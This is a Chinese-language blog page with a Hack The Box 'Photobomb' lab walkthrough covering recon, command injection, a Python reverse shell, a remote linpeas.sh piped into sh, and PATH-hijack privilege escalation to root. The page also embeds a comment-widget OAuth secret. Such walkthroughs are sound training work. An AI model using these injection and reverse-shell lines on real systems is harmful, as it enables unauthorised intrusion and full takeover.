@@ -1,0 +1,702 @@
+<!DOCTYPE html>
+<html>
+<head>
+    
+
+    
+
+    
+
+
+
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
+    
+    
+    
+    
+    <title>Photobomb - Hackthebox | Lucifiel&#39;s Blog | Lucifiel 技术博客</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#3F51B5">
+    
+    
+    <meta name="keywords" content="Hackthebox">
+    <meta name="description" content="Hackthebox Photobomb靶场信息                                                                                                            靶场类型">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Photobomb - Hackthebox">
+<meta property="og:url" content="http://www.lucifiel.com/2023/05/07/Hackthebox%20-%20Photobomb/index.html">
+<meta property="og:site_name" content="Lucifiel&#39;s Blog">
+<meta property="og:description" content="Hackthebox Photobomb靶场信息                                                                                                            靶场类型">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://www.lucifiel.com/2023/05/07/Hackthebox%20-%20Photobomb/LDSrVGy7C-CZ7F3nAHq-IuMX_R1fUhShKILYvbBmdYU.png">
+<meta property="og:image" content="http://www.lucifiel.com/2023/05/07/Hackthebox%20-%20Photobomb/Z58a5zra-7yWwrvMrcB3tRTw0RNMOFa0beuFkWJnvaM.png">
+<meta property="og:image" content="http://www.lucifiel.com/2023/05/07/Hackthebox%20-%20Photobomb/tkGwDpifhm3JtLgP0-ZCkdx83b7cHyEUmLp-ik233gM.png">
+<meta property="og:image" content="http://www.lucifiel.com/2023/05/07/Hackthebox%20-%20Photobomb/2jMWJ9zAeBFV-5nrxU0G9On-hDUfjEYANzQJJxYr4gs.png">
+<meta property="og:image" content="http://www.lucifiel.com/2023/05/07/Hackthebox%20-%20Photobomb/ZYCIfyfoZq4528NhfhqdT6QmomoMT6Ve6yc7QsMDChc.png">
+<meta property="og:image" content="http://www.lucifiel.com/2023/05/07/Hackthebox%20-%20Photobomb/9_2oS_8TL0oUNogTS5JsVPuln6yEQhwJ06j0S6TBFFo.png">
+<meta property="og:image" content="http://www.lucifiel.com/2023/05/07/Hackthebox%20-%20Photobomb/CJ4wo47Fx8GJ9YWKdqI0UuQCpMIc71t2WfwPkzPuGYI.png">
+<meta property="og:image" content="http://www.lucifiel.com/2023/05/07/Hackthebox%20-%20Photobomb/ZzlaUOXNz-uE93DbPVB_jlejAXtCfmbang9vUvL8do0.png">
+<meta property="og:image" content="http://www.lucifiel.com/2023/05/07/Hackthebox%20-%20Photobomb/kc8KUSvk8sbI-nkpWxbaSmWB5dND6Qnt6lMGiFKTyn8.png">
+<meta property="og:image" content="http://www.lucifiel.com/2023/05/07/Hackthebox%20-%20Photobomb/9apax9ywCGMJ0KkdoHbYX0ycsvCto4mMWgnG58hu2kc.png">
+<meta property="og:image" content="http://www.lucifiel.com/2023/05/07/Hackthebox%20-%20Photobomb/AuDr59V7VTsfWQtLB40crZN8mIq4O-_Bb8Lb7mMI0hU.png">
+<meta property="article:published_time" content="2023-05-07T11:38:36.000Z">
+<meta property="article:modified_time" content="2023-05-20T02:43:24.168Z">
+<meta property="article:author" content="Lucifiel">
+<meta property="article:tag" content="Hackthebox">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://www.lucifiel.com/2023/05/07/Hackthebox%20-%20Photobomb/LDSrVGy7C-CZ7F3nAHq-IuMX_R1fUhShKILYvbBmdYU.png">
+    
+        <link rel="alternate" type="application/atom+xml" title="Lucifiel&#39;s Blog" href="/atom.xml">
+    
+    <link rel="shortcut icon" href="/favicon.ico">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+
+<meta name="generator" content="Hexo 4.2.1"><!-- hexo-inject:begin --><!-- hexo-inject:end --></head>
+
+<body>
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="loading" class="active"></div>
+
+    <aside id="menu" class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">Lucifiel</h5>
+          <a href="mailto:LucifielHack@qq.com" title="LucifielHack@qq.com" class="mail">LucifielHack@qq.com</a>
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="waves-block waves-effect">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                主页
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                Archives
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                Tags
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                Categories
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://github.com/LucifielHack" target="_blank" >
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/about"  >
+                <i class="icon icon-lg icon-user"></i>
+                About
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">Photobomb - Hackthebox</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
+            <i class="icon icon-lg icon-share-alt"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+
+    <div class="container fade-scale">
+        <h1 class="title">Photobomb - Hackthebox</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2023-05-07T11:38:36.000Z" itemprop="datePublished" class="page-time">
+  2023-05-07
+</time>
+
+
+            
+        </h5>
+    </div>
+
+    
+
+
+</header>
+
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Hackthebox-Photobomb"><span class="post-toc-number">1.</span> <span class="post-toc-text">Hackthebox Photobomb</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#靶场信息"><span class="post-toc-number">2.</span> <span class="post-toc-text">靶场信息</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#靶场类型"><span class="post-toc-number">3.</span> <span class="post-toc-text">靶场类型</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#信息收集"><span class="post-toc-number">4.</span> <span class="post-toc-text">信息收集</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Nmap"><span class="post-toc-number">4.1.</span> <span class="post-toc-text">Nmap</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Http"><span class="post-toc-number">4.2.</span> <span class="post-toc-text">Http</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#漏洞利用"><span class="post-toc-number">5.</span> <span class="post-toc-text">漏洞利用</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#权限提升"><span class="post-toc-number">6.</span> <span class="post-toc-text">权限提升</span></a></li></ol>
+        </nav>
+    </aside>
+
+
+<article id="post-Hackthebox - Photobomb"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">Photobomb - Hackthebox</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2023-05-07 19:38:36" datetime="2023-05-07T11:38:36.000Z"  itemprop="datePublished">2023-05-07</time>
+
+            
+
+
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
+</span>
+
+
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <h1 id="Hackthebox-Photobomb"><a href="#Hackthebox-Photobomb" class="headerlink" title="Hackthebox Photobomb"></a>Hackthebox Photobomb</h1><h1 id="靶场信息"><a href="#靶场信息" class="headerlink" title="靶场信息"></a>靶场信息</h1><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2023/05/07/Hackthebox%20-%20Photobomb/LDSrVGy7C-CZ7F3nAHq-IuMX_R1fUhShKILYvbBmdYU.png" alt title>
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h1 id="靶场类型"><a href="#靶场类型" class="headerlink" title="靶场类型"></a>靶场类型</h1><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2023/05/07/Hackthebox%20-%20Photobomb/Z58a5zra-7yWwrvMrcB3tRTw0RNMOFa0beuFkWJnvaM.png" alt title>
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><pre><code class="Plain">┌──(root㉿kali)-[~/Desktop]
+└─# nmap -sS -sV -A -sC -p- --min-rate 5000 10.10.11.182
+Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-20 23:49 EST
+Nmap scan report for 10.10.11.182
+Host is up (0.26s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 e22473bbfbdf5cb520b66876748ab58d (RSA)
+|   256 04e3ac6e184e1b7effac4fe39dd21bae (ECDSA)
+|_  256 20e05d8cba71f08c3a1819f24011d29e (ED25519)
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://photobomb.htb/
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.93%E=4%D=12/20%OT=22%CT=1%CU=41677%PV=Y%DS=2%DC=T%G=Y%TM=63A290
+OS:81%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=105%TI=Z%CI=Z%II=I%TS=A)SE
+OS:Q(SP=105%GCD=1%ISR=105%TI=Z%CI=Z%TS=A)OPS(O1=M539ST11NW7%O2=M539ST11NW7%
+OS:O3=M539NNT11NW7%O4=M539ST11NW7%O5=M539ST11NW7%O6=M539ST11)WIN(W1=FE88%W2
+OS:=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M539NNS
+OS:NW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%
+OS:DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%
+OS:O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%
+OS:W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%
+OS:RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)
+
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 995/tcp)
+HOP RTT       ADDRESS
+1   275.46 ms 10.10.14.1
+2   282.41 ms 10.10.11.182
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 48.89 seconds
+</code></pre>
+<h2 id="Http"><a href="#Http" class="headerlink" title="Http"></a>Http</h2><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2023/05/07/Hackthebox%20-%20Photobomb/tkGwDpifhm3JtLgP0-ZCkdx83b7cHyEUmLp-ik233gM.png" alt title>
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>会被跳转到域名 photobomb.htb 去加入 hosts 解析</p>
+<pre><code class="Plain">echo 10.10.11.182 photobomb.htb &gt;&gt; /etc/hosts
+</code></pre>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2023/05/07/Hackthebox%20-%20Photobomb/2jMWJ9zAeBFV-5nrxU0G9On-hDUfjEYANzQJJxYr4gs.png" alt title>
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>再访问一次就是正常的了</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2023/05/07/Hackthebox%20-%20Photobomb/ZYCIfyfoZq4528NhfhqdT6QmomoMT6Ve6yc7QsMDChc.png" alt title>
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>首页有个 click here，点击后会跳转登陆页面，去找一下密码</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2023/05/07/Hackthebox%20-%20Photobomb/9_2oS_8TL0oUNogTS5JsVPuln6yEQhwJ06j0S6TBFFo.png" alt title>
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>在 js 文件中发现一段 photobomb.js</p>
+<pre><code class="javascript">function init() {
+  // Jameson: pre-populate creds for tech support as they keep forgetting them and emailing me
+  if (document.cookie.match(/^(.*;)?\s*isPhotoBombTechSupport\s*=\s*[^;]+(.*)?$/)) {
+    document.getElementsByClassName(&#39;creds&#39;)[0].setAttribute(&#39;href&#39;,&#39;http://pH0t0:b0Mb!@photobomb.htb/printer&#39;);
+  }
+}
+window.onload = init;
+</code></pre>
+<p>在里面找到了一段链接，里面应该就是账号密码了</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2023/05/07/Hackthebox%20-%20Photobomb/CJ4wo47Fx8GJ9YWKdqI0UuQCpMIc71t2WfwPkzPuGYI.png" alt title>
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>登陆成功</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2023/05/07/Hackthebox%20-%20Photobomb/ZzlaUOXNz-uE93DbPVB_jlejAXtCfmbang9vUvL8do0.png" alt title>
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>他下面有个下载图片的功能，抓个包看看</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2023/05/07/Hackthebox%20-%20Photobomb/kc8KUSvk8sbI-nkpWxbaSmWB5dND6Qnt6lMGiFKTyn8.png" alt title>
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>确实是下载，但是这个参数看着很有搞头啊，这看着就是很明显的命令拼接执行</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2023/05/07/Hackthebox%20-%20Photobomb/9apax9ywCGMJ0KkdoHbYX0ycsvCto4mMWgnG58hu2kc.png" alt title>
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>在 filetype 后面似乎可以拼接，但是没有回显，去开启一个 http 服务器试试</p>
+<pre><code class="python">python3 -m http.server 80
+</code></pre>
+<pre><code class="Plain">photo=voicu-apostol-MWER49YaD-M-unsplash.jpg&amp;filetype=jpg;curl+http://10.10.14.11&amp;dimensions=30x20
+</code></pre>
+<p>然后去请求一下</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2023/05/07/Hackthebox%20-%20Photobomb/AuDr59V7VTsfWQtLB40crZN8mIq4O-_Bb8Lb7mMI0hU.png" alt title>
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>确实有回包，那就证明可以执行命令</p>
+<pre><code class="python">export RHOST=&quot;10.10.14.11&quot;;export RPORT=4444;python3 -c &#39;import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(&quot;RHOST&quot;),int(os.getenv(&quot;RPORT&quot;))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&quot;/bin/bash&quot;)&#39;
+</code></pre>
+<p>我们构造好 poc 以后，使用 nc 监听一个端口</p>
+<pre><code class="bash">nc -nvlp 4444
+</code></pre>
+<p>然后去 burp 中执行</p>
+<pre><code class="python">export RHOST=&quot;10.10.14.11&quot;;export RPORT=4444;python3 -c &#39;import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(&quot;RHOST&quot;),int(os.getenv(&quot;RPORT&quot;))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&quot;/bin/bash&quot;)&#39;
+</code></pre>
+<pre><code class="python">┌──(root㉿kali)-[~/Desktop]
+└─# nc -nvlp 4444
+listening on [any] 4444 ...
+connect to [10.10.14.11] from (UNKNOWN) [10.10.11.182] 46772
+wizard@photobomb:~/photobomb$ python3 -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;
+python3 -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;
+wizard@photobomb:~/photobomb$ whoami&amp;&amp;id
+whoami&amp;&amp;id
+wizard
+uid=1000(wizard) gid=1000(wizard) groups=1000(wizard)
+</code></pre>
+<p>成功弹回 shell</p>
+<pre><code class="python">wizard@photobomb:~$ cat user.txt
+cat user.txt
+9ef16b54cbd2be4ef91cf67b6642e804
+</code></pre>
+<p>成功拿到 user 权限的 flag 文件</p>
+<h1 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h1><p>先跑个 linpeas 看看</p>
+<pre><code class="python">curl -L http://10.10.14.11/linpeas.sh|sh
+</code></pre>
+<pre><code class="python">wizard@photobomb:~$ sudo -l
+sudo -l
+Matching Defaults entries for wizard on photobomb:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User wizard may run the following commands on photobomb:
+    (root) SETENV: NOPASSWD: /opt/cleanup.sh
+</code></pre>
+<p>可以看到，我们可以无密码使用 root 权限执行 &#x2F;opt&#x2F;cleanup.sh，先去看看这个文件</p>
+<pre><code class="python">#!/bin/bash
+. /opt/.bashrc
+cd /home/wizard/photobomb
+
+# clean up log files
+if [ -s log/photobomb.log ] &amp;&amp; ! [ -L log/photobomb.log ]
+then
+  /bin/cat log/photobomb.log &gt; log/photobomb.log.old
+  /usr/bin/truncate -s0 log/photobomb.log
+fi
+
+# protect the priceless originals
+find source_images -type f -name &#39;*.jpg&#39; -exec chown root:root {} \;
+</code></pre>
+<p>对于这个文件，我们只有读取和写入权限，所以我们得先搞清楚他干了什么</p>
+<p>大概看了一下，功能简单的说就是获取日志文件并将其内容移动到 photobonb.log.old，然后使用 truncate 清除 photobomb.log</p>
+<p>这里的突破点在于最后一句，他的 find 命令使用的是相对路径，而不是绝对路径，我们就可以改变一下环境变量，然后在当前目录创建一个 find 文件，里面写一个恶意 poc，然后 sudo 执行的时候，就能直接获得我们想要的结果</p>
+<pre><code class="python">echo &quot;/bin/bash&quot; &gt; find
+chmod +x find
+sudo PATH=$PWD:$PATH /opt/cleanup.sh
+</code></pre>
+<pre><code class="python">wizard@photobomb:~$ echo &quot;/bin/bash&quot; &gt; find
+echo &quot;/bin/bash&quot; &gt; find
+wizard@photobomb:~$ chmod +x find
+chmod +x find
+wizard@photobomb:~$ sudo PATH=$PWD:$PATH /opt/cleanup.sh
+sudo PATH=$PWD:$PATH /opt/cleanup.sh
+root@photobomb:/home/wizard/photobomb# id
+id
+uid=0(root) gid=0(root) groups=0(root)
+root@photobomb:/home/wizard/photobomb# whoami
+whoami
+root
+</code></pre>
+<p>成功获得 root 权限</p>
+<pre><code class="python">root@photobomb:/home/wizard/photobomb# cat /root/root.txt
+cat /root/root.txt
+aefec07aac4191d73f9f0e8dadd6ee58
+</code></pre>
+<p>成功获得 root 权限的 flag 文件</p>
+
+        </div>
+
+        <blockquote class="post-copyright">
+    
+    <footer>
+        <a href="http://www.lucifiel.com">
+            <img src="/img/avatar.jpg" alt="Lucifiel">
+            Lucifiel
+        </a>
+    </footer>
+</blockquote>
+
+        
+
+
+        <div class="post-footer">
+            
+	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Hackthebox/" rel="tag">Hackthebox</a></li></ul>
+
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.lucifiel.com/2023/05/07/Hackthebox%20-%20Photobomb/&title=《Photobomb - Hackthebox》 — Lucifiel's Blog&pic=http://www.lucifiel.com/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.lucifiel.com/2023/05/07/Hackthebox%20-%20Photobomb/&title=《Photobomb - Hackthebox》 — Lucifiel's Blog&source=Lucifiel 技术博客" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.lucifiel.com/2023/05/07/Hackthebox%20-%20Photobomb/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Photobomb - Hackthebox》 — Lucifiel's Blog&url=http://www.lucifiel.com/2023/05/07/Hackthebox%20-%20Photobomb/&via=http://www.lucifiel.com" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.lucifiel.com/2023/05/07/Hackthebox%20-%20Photobomb/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="waves-block waves-effect prev">
+      <a href="/2023/05/07/Hackthebox%20-%20MonitorsTwo/" id="post-prev" class="post-nav-link">
+        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
+        <h4 class="title">MonitorsTwo - Hackthebox</h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/2023/03/12/Hackthebox%20-%20Awkward/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">Awkward - Hackthebox</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<section class="comments" id="comments">
+    <div id="gitalk-container"></div>
+    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+    <script>
+        var id = location.pathname
+        if (location.pathname.length > 50) {
+          id = location.pathname.replace(/\/\d+\/\d+\/\d+\//, '').replace('/', '').substring(0, 50)
+        }
+        const gitalk = new Gitalk({
+          clientID: 'cf0a9809323df14a9168',
+          clientSecret: 'a30d7a21bf6d88b7ad5c1f5d1bfc45881c49b2ed',
+          repo: 'LucifielHack.github.io',
+          owner: 'LucifielHack',
+          admin: ['LucifielHack'],
+          id: id,      // Ensure uniqueness and length less than 50
+          title: document.title.split('|')[0],
+          distractionFreeMode: false  // Facebook-like distraction free mode
+        })
+
+        gitalk.render('gitalk-container')
+    </script>
+</section>
+
+
+
+
+</article>
+
+
+
+</div>
+
+        <footer class="footer">
+    <div class="top">
+        
+<p>
+    <span id="busuanzi_container_site_uv" style='display:none'>
+        站点总访客数：<span id="busuanzi_value_site_uv"></span>
+    </span>
+    <span id="busuanzi_container_site_pv" style='display:none'>
+        站点总访问量：<span id="busuanzi_value_site_pv"></span>
+    </span>
+</p>
+
+
+        <p>
+            <!--- 
+                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
+            
+            <span>footer.license</span> --->
+        </p>
+    </div>
+    <div class="bottom">
+        <p><span>Lucifiel &copy; 2020 - 2023</span>
+            <span>
+                
+                Power by Lucifiel</a>
+            </span>
+        </p>
+    </div>
+</footer>
+
+    </main>
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.lucifiel.com/2023/05/07/Hackthebox%20-%20Photobomb/&title=《Photobomb - Hackthebox》 — Lucifiel's Blog&pic=http://www.lucifiel.com/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.lucifiel.com/2023/05/07/Hackthebox%20-%20Photobomb/&title=《Photobomb - Hackthebox》 — Lucifiel's Blog&source=Lucifiel 技术博客" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.lucifiel.com/2023/05/07/Hackthebox%20-%20Photobomb/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Photobomb - Hackthebox》 — Lucifiel's Blog&url=http://www.lucifiel.com/2023/05/07/Hackthebox%20-%20Photobomb/&via=http://www.lucifiel.com" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.lucifiel.com/2023/05/07/Hackthebox%20-%20Photobomb/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMYAAADGCAAAAACs8KCBAAACLklEQVR42u3aS07DQBAFQN//0mHDAilKeK+HIHmmvEKJY7u8aPp3XfHx+HE8f5J8217z+sSBgYFxW8bj7ZGc83zm8/Xffzu7LwYGxmmMVxGsPWcGy3/78nMMDAyMOF1LQmcb6DEwMDBaRlKU5rdPqBgYGBjrga9trrUl8R/X4hgYGDdk5Anf///9kfkGBgbGrRgrQTAPuJ8Lyt/XwcDA2JqRB7i26d8uZ7TLFhgYGOcwkp/Nkrn2gZaug4GBcSQjSd1WXkS+OpakpBgYGHszZg/a3maYsZYvFAMDY1dGnoq1C17raV+x0oGBgXEAo236r7T+2/A6LGIxMDA2YiQN/fc3mIXIvKzNy10MDIwTGC0pZyeDz7bErf+fYGBg3JbRlpF5wleUoGVAf7ktgoGBsSkjKVaTxK4tZfOWXBGgMTAwNmXMWvnJS2mbd0kRW6SGGBgYGzHyZlleAc8edzZguNrJJwYGxg0ZeTirO3YfXrbAwMA4h5E339uydjZ6TK72y0vEwMDYlNGGznwwuRLE8wYfBgbGOYzk1LzgnLXVloapGBgYBzBmSxV5UdouWwzLVwwMjO0Y6wsWbQE8K56LpBADA2M7RjvgzNPEHJM35mbDCQwMjD0YbZDNRwJ/FayjFBYDA+MARrsqsRIi88SxeCoMDAyM0RJGEmTzMjXaFsHAwMAo1y/WhxDFchgGBsYBjHx5or1BkmK2aSIGBsZpjJXScX3lYmWZAwMD4wDGF4JHqHZhLdJoAAAAAElFTkSuQmCC" alt="微信分享二维码">
+</div>
+
+
+
+
